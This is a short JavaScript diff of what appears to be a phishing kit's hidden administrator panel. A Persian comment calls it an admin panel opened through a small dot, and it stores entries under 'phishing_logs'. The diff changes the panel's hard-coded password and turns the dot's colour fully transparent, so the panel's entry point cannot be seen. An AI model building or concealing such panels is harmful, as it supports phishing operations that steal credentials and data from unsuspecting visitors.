@@ -1,7 +1,7 @@
 // پنل مدیریت با نقطه کوچک
 class SimpleAdminPanel {
     constructor() {
-        this.password = "admin123";
+        this.password = "admin858581";
         this.storageKey = "phishing_logs";
         this.init();
     }
@@ -32,7 +32,7 @@ class SimpleAdminPanel {
             width: 8px;
             height: 8px;
             font-size: 20px;
-            color: rgba(0,0,0,0.2);
+            color: rgba(0,0,0,0.0);
             cursor: pointer;
             z-index: 9999;
             user-select: none;
